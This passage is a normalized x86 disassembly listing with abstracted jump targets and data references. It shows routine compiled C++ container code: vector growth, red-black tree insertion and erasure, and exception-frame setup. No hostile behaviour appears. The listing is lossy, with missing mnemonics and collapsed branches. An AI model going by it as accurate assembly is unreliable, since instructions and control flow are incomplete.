jne r-xdata
cmp esi [ ecx ]
jne r-xdata
mov [ ecx + 0x2c ] bl
mov [ edx + 0x2c ] bl
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0x2c ] 0x0
mov eax [ eax ]
mov esi [ eax + 0x4 ]
jmp r-xdata
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov [ ecx + 0x2c ] bl
mov [ edx + 0x2c ] bl
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0x2c ] 0x0
mov eax [ eax ]
mov esi [ eax + 0x4 ]
jmp r-xdata
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x2c ] bl
mov edx [ esi + 0x4 ]
mov eax [ edx + 0x4 ]
mov [ eax + 0x2c ] 0x0
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x4 ]
push edx
mov ecx edi
call sub_40afa0
mov esi ecx
push esi
mov ecx edi
call sub_40b000
mov ecx [ esi + 0x4 ]
mov dl [ ecx + 0x2c ]
test dl dl
lea eax [ esi + 0x4 ]
je r-xdata
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x2c ] bl
mov edx [ esi + 0x4 ]
mov eax [ edx + 0x4 ]
mov [ eax + 0x2c ] 0x0
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x4 ]
push edx
mov ecx edi
call sub_40b000
jmp r-xdata
mov esi ecx
push esi
mov ecx edi
call sub_40afa0
mov ecx [ eax ]
mov ebp [ ecx + 0x4 ]
mov edx [ ebp ]
cmp ecx edx
jne r-xdata
mov ecx [ esp + 0x70 ]
pop ebp
sub_46b020
push esi
mov esi [ ecx + 0x4 ]
test esi esi
push edi
jne r-xdata
mov edx [ ecx + 0x8 ]
sub edx esi
xor edx edx
jmp r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax [ esp + 0xc ]
cmp edx eax
jae r-xdata
pop edi
pop esi
retn 0x8
mov edi [ ecx + 0x8 ]
mov edx edi
sub edx esi
cmp eax edx
jae r-xdata
mov edx [ ecx + 0x8 ]
sub edx esi
xor edx edx
jmp r-xdata
push ecx
mov edx esp
mov [ edx ] edi
mov edx [ ecx + 0x4 ]
push ecx
add edx eax
mov esi esp
lea eax [ esp + 0x18 ]
push eax
mov [ esi ] edx
call sub_461a70
sub eax edx
mov edx [ ecx + 0x8 ]
lea esi [ esp + 0x10 ]
push esi
push eax
push ecx
mov eax esp
mov [ eax ] edx
call sub_468e40
pop edi
pop esi
retn 0x8
sub_46b090
push ebx
push esi
mov esi [ ecx + 0x4 ]
test esi esi
push edi
jne r-xdata
mov edx [ ecx + 0x8 ]
sub edx esi
mov eax 0x66666667
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov edi [ esp + 0x10 ]
cmp edx edi
jae r-xdata
pop edi
pop esi
pop ebx
retn 0x18
mov ebx [ ecx + 0x8 ]
mov edx ebx
sub edx esi
mov eax 0x66666667
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
cmp edi edx
jae r-xdata
mov edx [ ecx + 0x8 ]
sub edx esi
mov eax 0x66666667
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
push ecx
mov eax esp
mov [ eax ] ebx
mov eax [ ecx + 0x4 ]
push ecx
mov edx esp
lea esi [ edi + edi * 4 ]
lea eax [ eax + esi * 4 ]
mov [ edx ] eax
lea edx [ esp + 0x18 ]
push edx
call sub_461be0
lea eax [ esp + 0x14 ]
push eax
sub edi edx
mov edx [ ecx + 0x8 ]
push edi
push ecx
mov eax esp
mov [ eax ] edx
call sub_4690d0
pop edi
pop esi
pop ebx
retn 0x18
sub_46b140
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
xor edi edi
jmp r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
mov eax 0x66666667
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x14 ] edx
jne r-xdata
mov edx [ esp + 0x18 ]
push edx
push 0x1
push ecx
mov eax esp
mov ecx esi
mov [ eax ] ebx
call sub_4690d0
mov ecx [ esi + 0x4 ]
lea eax [ edi + edi * 4 ]
pop edi
lea edx [ ecx + eax * 4 ]
mov eax [ esp + 0xc ]
pop esi
mov [ eax ] edx
pop ebx
retn 0xc
mov ecx ebx
sub ecx edi
mov eax 0x66666667
imul ecx
sar edx 0x3
mov ecx edx
shr ecx 0x1f
add edx ecx
mov edi edx
sub_46b1b0
push ebx
mov ebx ecx
push esi
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
mov [ ebx + 0x4 ] 0x0
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0xc ] 0x0
pop ebx
retn
push edi
mov edi [ ebx + 0x8 ]
cmp esi edi
je r-xdata
mov eax [ ebx + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
pop edi
mov ecx esi
call sub_460f30
add esi 0x80
cmp esi edi
jne r-xdata
sub_46b200
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c0d08
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
push esi
push edi
mov edi ecx
cmp [ edi + 0x8 ] 0x2222221
jb r-xdata
mov edx [ esp + 0x68 ]
mov eax [ edi + 0x4 ]
mov esi [ esp + 0x64 ]
push ebx
push 0x0
push edx
push eax
push esi
push eax
mov ecx edi
call sub_469de0
mov ebx [ edi + 0x8 ]
mov ecx eax
mov eax [ edi + 0x4 ]
inc ebx
cmp esi eax
mov [ esp + 0x6c ] ecx
mov [ edi + 0x8 ] ebx
jne r-xdata
xor esi esi
mov eax r--data
mov [ esp + 0x20 ] 0xf
mov [ esp + 0x1c ] esi
mov [ esp + 0xc ] 0x0
lea edx [ eax + 0x1 ]
mov al [ esp + 0x64 ]
test al al
je r-xdata
mov [ eax + 0x4 ] ecx
mov eax [ edi + 0x4 ]
mov [ eax ] ecx
mov edx [ edi + 0x4 ]
mov [ edx + 0x8 ] ecx
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x10 ]
call sub_401e80
lea eax [ esp + 0x8 ]
push eax
lea ecx [ esp + 0x28 ]
mov [ esp + 0x58 ] esi
call sub_402340
push r--data
lea ecx [ esp + 0x28 ]
push ecx
mov [ esp + 0x2c ] r--data
call sub_4b5bd2
mov [ esi + 0x8 ] ecx
mov eax [ edi + 0x4 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov [ esi ] ecx
mov eax [ edi + 0x4 ]
cmp esi [ eax ]
jne r-xdata
mov edx [ ecx + 0x4 ]
cmp [ edx + 0x88 ] 0x0
lea eax [ ecx + 0x4 ]
mov esi ecx
mov bl 0x1
jne r-xdata
mov [ eax + 0x8 ] ecx
mov [ eax ] ecx
jmp r-xdata
mov edx [ edi + 0x4 ]
mov eax [ edx + 0x4 ]
mov [ eax + 0x88 ] bl
mov eax [ esp + 0x60 ]
pop ebx
mov [ eax ] ecx
mov ecx [ esp + 0x4c ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x50
retn 0x10
push ebp
lea esp [ esp ]
cmp [ edx + 0x88 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x88 ] 0x0
jne r-xdata
mov [ ecx + 0x88 ] bl
mov [ edx + 0x88 ] bl
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0x88 ] 0x0
mov eax [ eax ]
mov esi [ eax + 0x4 ]
jmp r-xdata
cmp esi [ ecx ]
jne r-xdata
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov ecx [ esi + 0x4 ]
mov dl [ ecx + 0x88 ]
test dl dl
lea eax [ esi + 0x4 ]
je r-xdata
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x88 ] bl
mov edx [ esi + 0x4 ]
mov eax [ edx + 0x4 ]
mov [ eax + 0x88 ] 0x0
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x4 ]
push edx
mov ecx edi
call sub_45d950
mov esi ecx
push esi
mov ecx edi
call sub_45d9b0
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x88 ] bl
mov edx [ esi + 0x4 ]
mov eax [ edx + 0x4 ]
mov [ eax + 0x88 ] 0x0
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x4 ]
push edx
mov ecx edi
call sub_45d9b0
jmp r-xdata
mov esi ecx
push esi
mov ecx edi
call sub_45d950
mov ecx [ eax ]
mov ebp [ ecx + 0x4 ]
mov edx [ ebp ]
cmp ecx edx
jne r-xdata
mov ecx [ esp + 0x70 ]
pop ebp
sub_46b3f0
push ebx
mov ebx [ esp + 0x10 ]
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi ecx
mov eax [ edi + 0x4 ]
cmp esi [ eax ]
jne r-xdata
cmp esi ebx
je r-xdata
cmp ebx eax
jne r-xdata
mov eax [ esp + 0x10 ]
pop edi
mov [ eax ] esi
pop esi
pop ebx
retn 0xc
mov al [ esi + 0x2d ]
test al al
mov ecx esi
jne r-xdata
mov eax [ eax + 0x4 ]
push eax
mov ecx edi
call sub_465c70
mov eax [ edi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x4 ]
mov [ edi + 0x8 ] 0x0
mov [ eax ] eax
mov eax [ edi + 0x4 ]
mov [ eax + 0x8 ] eax
mov ecx [ edi + 0x4 ]
mov edx [ ecx ]
mov eax [ esp + 0x10 ]
pop edi
pop esi
mov [ eax ] edx
pop ebx
retn 0xc
push ecx
lea eax [ esp + 0x18 ]
push eax
mov ecx edi
call sub_465690
cmp esi ebx
jne r-xdata
mov eax [ esi + 0x8 ]
mov dl [ eax + 0x2d ]
test dl dl
jne r-xdata
mov eax [ esi + 0x4 ]
mov dl [ eax + 0x2d ]
test dl dl
jne r-xdata
mov esi eax
mov eax [ esi ]
mov dl [ eax + 0x2d ]
test dl dl
jne r-xdata
mov esi eax
cmp esi [ eax + 0x8 ]
jne r-xdata
mov edi edi
mov esi eax
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x2d ]
test dl dl
je r-xdata
mov esi eax
mov eax [ esi ]
mov dl [ eax + 0x2d ]
test dl dl
je r-xdata
jmp r-xdata
sub_46b4b0
mov edx [ esp + 0xc ]
push ebx
push ebp
mov ebp ecx
mov ecx [ esp + 0x10 ]
cmp ecx edx
push esi
push edi
je r-xdata
mov eax [ esp + 0x14 ]
pop edi
pop esi
pop ebp
mov [ eax ] ecx
pop ebx
retn 0xc
mov esi [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
push esi
push ecx
push ecx
mov ecx esp
mov [ ecx ] eax
push ecx
mov eax esp
mov [ eax ] edx
call sub_465de0
mov ebx [ ebp + 0x8 ]
mov esi eax
add esp 0x10
cmp esi ebx
mov edi esi
je r-xdata
mov ecx [ esp + 0x18 ]
mov [ ebp + 0x8 ] esi
mov ecx edi
call sub_460f30
add edi 0x80
cmp edi ebx
jne r-xdata
sub_46b530
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
push ecx
mov ecx [ esp + 0x14 ]
push ecx
push ecx
mov eax esp
push ecx
mov ecx [ esp + 0x18 ]
mov [ eax ] edx
mov eax esp
mov [ eax ] ecx
call sub_465fd0
add esp 0x14
retn 0xc
sub_46b560
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
push ecx
mov ecx [ esp + 0x14 ]
push ecx
push ecx
mov eax esp
push ecx
mov ecx [ esp + 0x18 ]
mov [ eax ] edx
mov eax esp
mov [ eax ] ecx
call sub_4660a0
add esp 0x14
retn 0xc
sub_46b590
push ebp
mov ebp esp
push 0xffffffff
push sub_4c0d20
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x4 ]
test eax eax
push edi
mov edi ecx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] edi
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov eax edi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
mov ecx [ edi + 0x4 ]
mov eax [ esi + 0x8 ]
mov esi [ esi + 0x4 ]
push edx
push edi
push ecx
push eax
push esi
mov [ ebp - 0x4 ] 0x0
call sub_465ef0
add esp 0x14
mov [ edi + 0x8 ] eax
push edx
mov ecx edi
call sub_4031a0
test al al
je r-xdata
sub_46b640
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
mov esi ecx
cmp esi ebp
push edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
mov eax [ ebp + 0x4 ]
test eax eax
je r-xdata
mov ecx esi
call sub_403b20
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
mov edi [ ebp + 0x8 ]
mov ecx edi
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov eax edx
test eax eax
mov [ esp + 0x14 ] eax
jne r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx ebx
mov eax 0x92492493
imul ecx
mov eax [ esp + 0x14 ]
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
test ebx ebx
jne r-xdata
mov edx [ esp + 0x14 ]
mov eax [ ebp + 0x4 ]
push edx
push ebx
push edi
push eax
call sub_465da0
mov ecx [ esi + 0x8 ]
add esp 0x10
push ecx
push eax
mov ecx esi
call sub_403920
mov eax [ ebp + 0x4 ]
test eax eax
jne r-xdata
cmp eax edx
ja r-xdata
mov ecx [ esi + 0xc ]
sub ecx ebx
mov eax 0x92492493
imul ecx
mov eax [ esp + 0x14 ]
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
mov ebp [ ebp + 0x8 ]
sub ebp eax
mov eax 0x92492493
imul ebp
add edx ebp
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov eax [ esi + 0x4 ]
imul edx edx 0x70
add edx eax
pop edi
mov [ esi + 0x8 ] edx
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
mov eax [ esi + 0x4 ]
xor edx edx
imul edx edx 0x70
add edx eax
pop edi
mov [ esi + 0x8 ] edx
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
mov edx [ esi + 0x8 ]
push edx
push ebx
call sub_403920
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov ecx ebp
call sub_4010f0
push eax
mov ecx esi
call sub_4031a0
test al al
je r-xdata
call sub_4010f0
mov edx [ esp + 0x14 ]
mov edi eax
mov eax [ ebp + 0x4 ]
imul edi edi 0x70
push edx
add edi eax
push ebx
push edi
push eax
call sub_465da0
mov ecx [ esp + 0x24 ]
mov eax [ esi + 0x8 ]
mov ebp [ ebp + 0x8 ]
push ecx
push esi
push eax
push ebp
push edi
call sub_465ef0
add esp 0x24
pop edi
mov [ esi + 0x8 ] eax
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
cmp eax edx
mov ecx esi
ja r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ ebp + 0x8 ]
mov ebp [ ebp + 0x4 ]
push ecx
push eax
push ebp
mov ecx esi
call sub_46b510
mov [ esi + 0x8 ] eax
sub_46b7e0
push esi
mov esi ecx
mov edx [ esi + 0x4 ]
test edx edx
push edi
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edx
sar ecx 0x4
xor ecx ecx
jmp r-xdata
mov edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
push edx
push 0x1
push ecx
mov ecx esp
mov [ ecx ] eax
mov ecx esi
call sub_429610
pop edi
pop esi
retn 0x4
mov eax [ esi + 0xc ]
sub eax edx
sar eax 0x4
cmp ecx eax
jae r-xdata
test edx edx
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0xc ]
mov edi [ esi + 0x8 ]
push eax
push esi
push ecx
push 0x1
push edi
call sub_428de0
add esp 0x14
add edi 0x10
mov [ esi + 0x8 ] edi
pop edi
pop esi
retn 0x4
sub_46b850
push esi
mov esi ecx
mov edx [ esi + 0x4 ]
test edx edx
push edi
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edx
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
push edx
push 0x1
push ecx
mov ecx esp
mov [ ecx ] eax
mov ecx esi
call sub_468120
pop edi
pop esi
retn 0x4
mov eax [ esi + 0xc ]
sub eax edx
sar eax 0x2
cmp ecx eax
jae r-xdata
test edx edx
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0xc ]
mov edi [ esi + 0x8 ]
push eax
push esi
push ecx
push 0x1
push edi
call sub_461b00
add esp 0x14
add edi 0x4
mov [ esi + 0x8 ] edi
pop edi
pop esi
retn 0x4
sub_46b8c0
push esi
mov esi ecx
mov edx [ esi + 0x4 ]
test edx edx
push edi
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edx
sar ecx 0x3
xor ecx ecx
jmp r-xdata
mov edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
push edx
push 0x1
push ecx
mov ecx esp
mov [ ecx ] eax
mov ecx esi
call sub_4693d0
pop edi
pop esi
retn 0x4
mov eax [ esi + 0xc ]
sub eax edx
sar eax 0x3
cmp ecx eax
jae r-xdata
test edx edx
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0xc ]
mov edi [ esi + 0x8 ]
push eax
push esi
push ecx
push 0x1
push edi
call sub_4607a0
add esp 0x14
add edi 0x8
mov [ esi + 0x8 ] edi
pop edi
pop esi
retn 0x4
sub_46b930
push ebx
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
mov eax 0x2aaaaaab
imul ecx
sar edx 0x1
mov eax edx
shr eax 0x1f
add edx eax
mov ebx edx
xor ebx ebx
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esi + 0x8 ]
push ecx
push ecx
mov eax esp
mov [ eax ] edx
lea eax [ esp + 0x18 ]
push eax
mov ecx esi
call sub_46ab70
pop edi
pop esi
pop ebx
retn 0x4
mov ecx [ esi + 0xc ]
sub ecx edi
mov eax 0x2aaaaaab
imul ecx
sar edx 0x1
mov ecx edx
shr ecx 0x1f
add edx ecx
cmp ebx edx
jae r-xdata
test edi edi
je r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov edi [ esi + 0x8 ]
push edx
push esi
push eax
push 0x1
push edi
call sub_4606a0
add esp 0x14
add edi 0xc
mov [ esi + 0x8 ] edi
pop edi
pop esi
pop ebx
retn 0x4
sub_46b9c0
sub esp 0xdc
push esi
push edi
mov eax ecx
sub esp 0xdc
mov edi esp
mov ecx 0x37
lea esi [ esp + 0xe4 ]
[ edi ] [ esi ]
mov ecx [ esp + 0x1c4 ]
push ecx
mov ecx eax
call sub_46abe0
pop edi
pop esi
add esp 0xdc
retn 0x4
sub_46ba00
push ebx
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
mov eax 0x94f2095
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
mov ebx edx
xor ebx ebx
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esi + 0x8 ]
push ecx
push ecx
mov eax esp
mov [ eax ] edx
lea eax [ esp + 0x18 ]
push eax
mov ecx esi
call sub_46aca0
pop edi
pop esi
pop ebx
retn 0x4
mov ecx [ esi + 0xc ]
sub ecx edi
mov eax 0x94f2095
imul ecx
sar edx 0x3
mov ecx edx
shr ecx 0x1f
add edx ecx
cmp ebx edx
jae r-xdata
test edi edi
je r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov edi [ esi + 0x8 ]
push edx
push esi
push eax
push 0x1
push edi
call sub_4606e0
add esp 0x14
add edi 0xdc
mov [ esi + 0x8 ] edi
pop edi
pop esi
pop ebx
retn 0x4
sub_46ba90
push ebx
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
mov eax 0x4ec4ec4f
imul ecx
sar edx 0x7
mov eax edx
shr eax 0x1f
add edx eax
mov ebx edx
xor ebx ebx
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esi + 0x8 ]
push ecx
push ecx
mov eax esp
mov [ eax ] edx
lea eax [ esp + 0x18 ]
push eax
mov ecx esi
call sub_46add0
pop edi
pop esi
pop ebx
retn 0x4
mov ecx [ esi + 0xc ]
sub ecx edi
mov eax 0x4ec4ec4f
imul ecx
sar edx 0x7
mov ecx edx
shr ecx 0x1f
add edx ecx
cmp ebx edx
jae r-xdata
test edi edi
je r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov edi [ esi + 0x8 ]
push edx
push esi
push eax
push 0x1
push edi
call sub_460710
add esp 0x14
add edi 0x1a0
mov [ esi + 0x8 ] edi
pop edi
pop esi
pop ebx
retn 0x4
sub_46bb20
sub esp 0x10
push ebx
push ebp
mov ebp ecx
mov eax [ ebp + 0x4 ]
mov edx [ eax + 0x4 ]
mov cl [ edx + 0x2d ]
test cl cl
push esi
mov ebx eax
mov al 0x1
push edi
mov edi [ esp + 0x28 ]
mov [ esp + 0x1c ] ebp
mov [ esp + 0x14 ] al
jne r-xdata
test al al
mov esi ebx
mov [ esp + 0x28 ] esi
je r-xdata
mov esi [ edi + 0x14 ]
mov [ esp + 0x10 ] esi
cmp [ edi + 0x18 ] 0x10
mov edx [ edi + 0x14 ]
lea ecx [ esi + 0xc ]
jb r-xdata
mov eax [ ebp + 0x4 ]
cmp ebx [ eax ]
jne r-xdata
lea eax [ edx + 0x10 ]
mov eax [ edx + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
jmp r-xdata
lea ecx [ esp + 0x28 ]
call sub_432a50
mov esi [ esp + 0x28 ]
push edi
push ebx
push 0x1
lea eax [ esp + 0x34 ]
push eax
mov ecx ebp
call sub_46ae40
mov ecx [ eax ]
mov eax [ esp + 0x24 ]
pop edi
pop esi
pop ebp
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x1
pop ebx
add esp 0x10
retn 0x8
test ebp ebp
je r-xdata
mov ebp esi
cmp esi ebp
jae r-xdata
mov eax [ esp + 0x24 ]
pop edi
mov [ eax ] esi
pop esi
pop ebp
mov [ eax + 0x4 ] 0x0
pop ebx
add esp 0x10
retn 0x8
mov eax [ esp + 0x14 ]
push edi
push ebx
push eax
lea ecx [ esp + 0x34 ]
push ecx
mov ecx ebp
call sub_46ae40
mov edx [ eax ]
mov eax [ esp + 0x24 ]
pop edi
pop esi
pop ebp
mov [ eax ] edx
mov [ eax + 0x4 ] 0x1
pop ebx
add esp 0x10
retn 0x8
push edx
mov edx [ ecx + 0x14 ]
push eax
push edx
push 0x0
call sub_401150
test eax eax
jge r-xdata
cmp ebp ebx
jae r-xdata
cmp ebp ebx
mov ecx ebp
jb r-xdata
xor eax eax
cmp ebp ebx
setne al
or eax 0xffffffff
jmp r-xdata
cmp [ edi + 0x18 ] 0x10
jb r-xdata
mov ecx ebx
mov edx [ edx + 0x8 ]
mov edx [ edx ]
jmp r-xdata
test eax eax
lea esi [ edi + 0x4 ]
mov esi [ edi + 0x4 ]
jmp r-xdata
cmp [ edx + 0x24 ] 0x10
mov ebx [ edx + 0x20 ]
mov [ esp + 0x18 ] edx
jb r-xdata
mov ebx [ esp + 0x18 ]
mov ebp [ esp + 0x1c ]
mov cl [ edx + 0x2d ]
test cl cl
je r-xdata
test eax eax
mov esi [ esp + 0x10 ]
mov edi [ esp + 0x28 ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
mov edi eax
xor eax eax
[ esi ] [ edi ]
je r-xdata
setl al
test al al
mov [ esp + 0x14 ] al
je r-xdata
sub_46bc80
push esi
mov esi ecx
mov edx [ esi + 0x4 ]
test edx edx
push edi
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edx
xor ecx ecx
jmp r-xdata
mov edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
push edx
push 0x1
push ecx
mov ecx esp
mov [ ecx ] eax
mov ecx esi
call sub_468e40
pop edi
pop esi
retn 0x4
mov eax [ esi + 0xc ]
sub eax edx
cmp ecx eax
jae r-xdata
test edx edx
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0xc ]
mov edi [ esi + 0x8 ]
push eax
push esi
push ecx
push 0x1
push edi
call sub_460740
add esp 0x14
inc edi
mov [ esi + 0x8 ] edi
pop edi
pop esi
retn 0x4
sub_46bce0
push ebx
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
mov eax 0x66666667
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
mov ebx edx
xor ebx ebx
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esi + 0x8 ]
push ecx
push ecx
mov eax esp
mov [ eax ] edx
lea eax [ esp + 0x18 ]
push eax
mov ecx esi
call sub_46b140
pop edi
pop esi
pop ebx
retn 0x4
mov ecx [ esi + 0xc ]
sub ecx edi
mov eax 0x66666667
imul ecx
sar edx 0x3
mov ecx edx
shr ecx 0x1f
add edx ecx
cmp ebx edx
jae r-xdata
test edi edi
je r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov edi [ esi + 0x8 ]
push edx
push esi
push eax
push 0x1
push edi
call sub_460770
add esp 0x14
add edi 0x14
mov [ esi + 0x8 ] edi
pop edi
pop esi
pop ebx
retn 0x4
sub_46bd80
push esi
mov esi ecx
mov edx [ esi + 0x4 ]
test edx edx
push edi
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edx
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
push edx
push 0x1
push ecx
mov ecx esp
mov [ ecx ] eax
mov ecx esi
call sub_448940
pop edi
pop esi
retn 0x4
mov eax [ esi + 0xc ]
sub eax edx
sar eax 0x2
cmp ecx eax
jae r-xdata
test edx edx
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0xc ]
mov edi [ esi + 0x8 ]
push eax
push esi
push ecx
push 0x1
push edi
call sub_420d80
add esp 0x14
add edi 0x4
mov [ esi + 0x8 ] edi
pop edi
pop esi
retn 0x4
sub_46bdf0
push esi
mov esi ecx
mov edx [ esi + 0x4 ]
test edx edx
push edi
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edx
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
push edx
push 0x1
push ecx
mov ecx esp
mov [ ecx ] eax
mov ecx esi
call sub_469770
pop edi
pop esi
retn 0x4
mov eax [ esi + 0xc ]
sub eax edx
sar eax 0x2
cmp ecx eax
jae r-xdata
test edx edx
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0xc ]
mov edi [ esi + 0x8 ]
push eax
push esi
push ecx
push 0x1
push edi
call sub_420d80
add esp 0x14
add edi 0x4
mov [ esi + 0x8 ] edi
pop edi
pop esi
retn 0x4
sub_46be60
mov eax [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
push ecx
push esi
push edi
call sub_46a1f0
mov eax esi
add esp 0x14
shl eax 0x5
add eax edi
pop edi
pop esi
retn 0xc
sub_46be90
push ecx
push ebx
mov ebx [ esp + 0x10 ]
push ebp
push esi
push edi
mov edi ecx
mov ebp [ edi + 0x4 ]
mov esi [ ebp + 0x4 ]
mov al [ esi + 0x89 ]
test al al
mov [ esp + 0x10 ] 0x1
jne r-xdata
mov ecx [ esp + 0x10 ]
push ebx
push ebp
push ecx
lea edx [ esp + 0x28 ]
push edx
mov ecx edi
call sub_46b200
mov ecx [ eax ]
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x1
pop ebx
pop ecx
retn 0x8
lea eax [ esi + 0x10 ]
push eax
push ebx
mov ecx edi
mov ebp esi
call sub_45f730
test al al
mov [ esp + 0x10 ] al
je r-xdata
mov esi [ esi + 0x8 ]
mov esi [ esi ]
jmp r-xdata
mov al [ esi + 0x89 ]
test al al
je r-xdata
sub_46bf00
push ecx
push ebx
mov ebx [ esp + 0x10 ]
push ebp
push esi
push edi
mov edi ecx
mov ebp [ edi + 0x4 ]
mov esi [ ebp + 0x4 ]
mov al [ esi + 0x89 ]
test al al
mov [ esp + 0x10 ] 0x1
jne r-xdata
mov ecx [ esp + 0x10 ]
push ebx
push ebp
push ecx
lea edx [ esp + 0x28 ]
push edx
mov ecx edi
call sub_46b200
mov ecx [ eax ]
